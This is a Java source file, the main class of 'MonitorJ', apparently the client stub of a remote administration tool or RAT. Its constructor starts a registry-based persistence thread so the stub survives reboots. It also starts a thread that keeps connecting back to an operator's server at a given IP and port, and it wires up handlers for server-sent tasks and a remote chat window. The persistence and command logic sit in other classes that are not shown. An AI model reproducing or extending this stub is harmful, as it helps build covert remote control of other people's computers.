package me.jershdervis.monitorj.stub;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTaskManager;
import me.jershdervis.monitorj.stub.eventapi.events.EventConnect;
import me.jershdervis.monitorj.stub.eventapi.events.EventDisconnect;
import me.jershdervis.monitorj.stub.eventapi.events.EventReceivePacket;
import me.jershdervis.monitorj.stub.secure.StartupMonitor;
import me.jershdervis.monitorj.stub.ui.RemoteChatWindow;

import java.io.IOException;

/**
 * Created by Josh on 18/06/2015.
 */
public class MonitorJStub {

    private static MonitorJStub instance;

    private final BaseClient clientServerConnection;

    //Interrupt when uninstalling
    private final Thread regPersist;

    public final EventConnect EVENT_CONNECT = new EventConnect();
    public final EventDisconnect EVENT_DISCONNECT = new EventDisconnect();
    public final EventReceivePacket EVENT_RECEIVE_PACKET = new EventReceivePacket();

    private final PacketTaskManager packetTaskManager;

    private final RemoteChatWindow chatWindow;

    private final String regKey;

    public MonitorJStub(String ip, int port, String key) throws IOException {
        instance = this;

        this.regKey = key;

        this.chatWindow = new RemoteChatWindow();

        this.packetTaskManager = new PacketTaskManager();

        //Initialize the Registry Persistence thread and store Thread locally
        (this.regPersist = new Thread(new StartupMonitor(key))).start();

        //Begin connection to server repetition thread
        new Thread(clientServerConnection = new BaseClient(ip, port)).start();
    }

    /**
     * Gets a static instance of the current class
     * @return
     */
    public static MonitorJStub getInstance() {
        return instance;
    }

    /**
     * Gets the Stubs config registry key name
     * @return
     */
    public String getRegKey() {
        return this.regKey;
    }

    /**
     * Gets the Thread for registry persistence
     * @return
     */
    public Thread getRegPersistThread() {
        return this.regPersist;
    }

    /**
     * Gets the initialized PacketTaskManager
     * @return
     */
    public PacketTaskManager getPacketTaskManager() {
        return this.packetTaskManager;
    }

    /**
     * Gets the RemoteChatWindow UI to be used when server requests
     * remote chat with client
     * @return
     */
    public RemoteChatWindow getChatWindow() {
        return this.chatWindow;
    }

    /**
     * Gets the BaseClient connection
     * @return
     */
    public BaseClient getClientServerConnection() {
        return this.clientServerConnection;
    }
}
